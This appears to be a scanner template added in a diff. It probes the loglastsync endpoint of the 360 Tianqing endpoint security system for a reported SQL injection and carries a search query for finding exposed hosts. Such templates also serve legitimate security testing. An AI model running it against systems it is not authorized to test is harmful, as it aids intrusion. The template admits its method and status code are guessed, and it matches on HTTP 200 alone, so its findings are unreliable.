@@ -1,0 +1,23 @@
+id: poc-15056449a35122418b10
+info:
+  name: 360天擎终端安全管理系统loglastsync存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/15056449a35122418b102379a7bd26c6
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 15056449a35122418b102379a7bd26c6
+    fofa: + hunter`app.name=="天擎终端安全管理系统"`
+http:
+- raw:
+  - 'GET /api/dp/loglastsync?ccid=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
